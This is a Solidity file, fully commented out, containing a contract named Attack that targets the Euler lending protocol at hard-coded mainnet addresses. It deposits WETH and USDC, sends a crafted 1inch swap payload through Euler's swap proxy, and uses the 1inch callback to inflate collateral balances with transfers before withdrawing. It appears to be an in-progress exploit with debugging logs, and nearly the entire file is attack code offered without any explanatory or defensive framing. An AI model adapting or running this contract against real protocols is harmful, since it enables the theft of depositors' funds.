
// import "forge-std/Test.sol";
// import { ERC20 } from "solmate/tokens/ERC20.sol";

// contract OneInchSwapUtils {
//  uint256 private constant _SHOULD_CLAIM = 0x04;

//     struct SwapDescription {
//             address srcToken;
//             address dstToken;
//             address srcReceiver;
//             address dstReceiver;
//             uint256 amount;
//             uint256 minReturnAmount;
//             uint256 flags;
//             bytes permit;
//         }
//     function generatePayload(address srcToken, address dstToken, address receiver, uint256 balance) internal view returns(bytes memory payload) {

//         SwapDescription memory description = SwapDescription(
//             srcToken, dstToken, address(this), receiver, balance,
//             1, // minreturn
//             _SHOULD_CLAIM, ""
//         );
//         payload = abi.encodeWithSelector(0x7c025200, address(this), description, abi.encode(balance, balance, balance));
//     }
// }

// interface EulerLike {
//     /// @notice Params for 1Inch trade
//     /// @param subAccountIdIn subaccount id to trade from
//     /// @param subAccountIdOut subaccount id to trade to
//     /// @param underlyingIn sold token address
//     /// @param underlyingOut bought token address
//     /// @param amount amount of token to sell
//     /// @param amountOutMinimum minimum amount of bought token
//     /// @param payload call data passed to 1Inch contract
//     struct Swap1InchParams {
//         uint subAccountIdIn;
//         uint subAccountIdOut;
//         address underlyingIn;
//         address underlyingOut;
//         uint amount;
//         uint amountOutMinimum;
//         bytes payload;
//     }
//     function swap1Inch(Swap1InchParams memory params) external;
// }

// interface ETokenLike {
//     function deposit(uint subAccountId, uint amount) external;
//     function balanceOfUnderlying(address account) external view returns (uint);
//     function withdraw(uint subAccountId, uint amount) external;
// }

// interface DTokenLike {
//     function borrow(uint subAccountId, uint amount) external;
// }

// interface PTokenLike {
//     function wrap(uint amount) external;
//     function unwrap(uint amount) external;
// }

// interface MarketsLike {
//     function underlyingToEToken(address underlying) external view returns (address);
//     function underlyingToDToken(address underlying) external view returns (address);
//     function enterMarket(uint subAccountId, address newMarket) external;
//     function activatePToken(address underlying) external returns(address);
// }

// // import "hardhat/console.sol";
// contract Attack is OneInchSwapUtils {
//     address EULER_MAINNET_MARKETS = 0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3;
//     address SWAP_PROXY = 0x7123C8cBBD76c5C7fCC9f7150f23179bec0bA341;
//     address euler = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
//     address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
//     address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
//     address oneInchAddress = 0x1111111254fb6c44bAC0beD2854e76F90643097d;
//     uint256 PUMPAMOUNT;
//     constructor() {

//     }

//     function getSubAccount(address primary, uint subAccountId) internal pure returns (address) {
//         require(subAccountId < 256, "e/sub-account-id-too-big");
//         return address(uint160(primary) ^ uint160(subAccountId));
//     }

//     function attack(uint256 depositAmount, uint256 borrowAmount) public {
//         depositPtoken(WETH, depositAmount);
//         borrow(WETH, borrowAmount);
//     }

//     function depositPtoken(address underlying, uint256 amount) public {
//         MarketsLike markets = MarketsLike(EULER_MAINNET_MARKETS);
//         address ptoken = markets.activatePToken(underlying);
//         ERC20(underlying).approve(ptoken, type(uint).max);
//         PTokenLike(ptoken).wrap(amount);
//         markets.enterMarket(0, underlying);
//         markets.enterMarket(0, ptoken);
//     }

//     function attack(uint256 depositAmount, uint256 pumpAmount, uint256 borrowAmount, uint256 subAccountAmount, uint256 withdrawAmount) public {
//         MarketsLike markets = MarketsLike(EULER_MAINNET_MARKETS);

//         {
//             uint256 usdcAmount = 10**6;
//             deposit(WETH, depositAmount);
//             deposit(USDC, usdcAmount);
//             // borrow(WETH, borrowAmount);
//             ERC20 eWETH = ERC20(markets.underlyingToEToken(WETH));
//             // eWETH.transfer(getSubAccount(address(this), 1), subAccountAmount);

//             // pump it in the 1inch call back
//             PUMPAMOUNT = pumpAmount;
//             console.log("beforeSwap");
//             swap(USDC, WETH, usdcAmount / 10);
//         }
//         {
//             ETokenLike collateralEToken = ETokenLike(markets.underlyingToEToken(WETH));
//             uint256 underlying = collateralEToken.balanceOfUnderlying(address(this));
//             console.log("underlying:", underlying);
//             collateralEToken.withdraw(0, withdrawAmount);
//             // withdraw
//         }
//     }

//     function borrow(address token, uint256 amount) public {
//         MarketsLike markets = MarketsLike(EULER_MAINNET_MARKETS);
//         DTokenLike borrowedDToken = DTokenLike(markets.underlyingToDToken(token));
//         borrowedDToken.borrow(0, amount);
//     }

//     function deposit(address collateral, uint256 amount) public {
//         // IEulerMarkets markets = IEulerMarkets(EULER_MAINNET_MARKETS);
//         MarketsLike markets = MarketsLike(EULER_MAINNET_MARKETS);
//         address ptoken = markets.activatePToken(WETH);
//         // Approve, get eToken addr, and deposit:
//         IERC20(collateral).approve(euler, type(uint).max);
//         ETokenLike collateralEToken = ETokenLike(markets.underlyingToEToken(collateral));
//         collateralEToken.deposit(0, amount);

//         // Enter the collateral market (collateral's address, *not* the eToken address):
//         markets.enterMarket(0, collateral);
//         markets.enterMarket(0, ptoken);
//     }

//     function swap(address srcToken, address receiveToken, uint256 amount) public {
//         EulerLike.Swap1InchParams memory params = EulerLike.Swap1InchParams(
//             0, 0, // set subaccountId 0
//             srcToken, receiveToken,
//             amount, 1, generatePayload(srcToken, receiveToken, address(this), amount)
//         );
//         EulerLike(SWAP_PROXY).swap1Inch(params);
//     }

//     fallback() external payable {
//         require(msg.sender == oneInchAddress);
//         console.log("hi there");

//         MarketsLike markets = MarketsLike(EULER_MAINNET_MARKETS);
//         ETokenLike collateralEToken = ETokenLike(markets.underlyingToEToken(WETH));
//         uint256 underlyingAmount = collateralEToken.balanceOfUnderlying(
//             getSubAccount(address(this), 1));

//         console.log("underlyingAmount:", underlyingAmount);

//         IERC20(WETH).transfer(euler, PUMPAMOUNT);
//         IERC20(WETH).transfer(oneInchAddress, PUMPAMOUNT);


//         underlyingAmount = collateralEToken.balanceOfUnderlying(
//             getSubAccount(address(this), 1));

//         console.log("underlyingAmount:", underlyingAmount);

//         // design for 1inch callback
//     }
// }

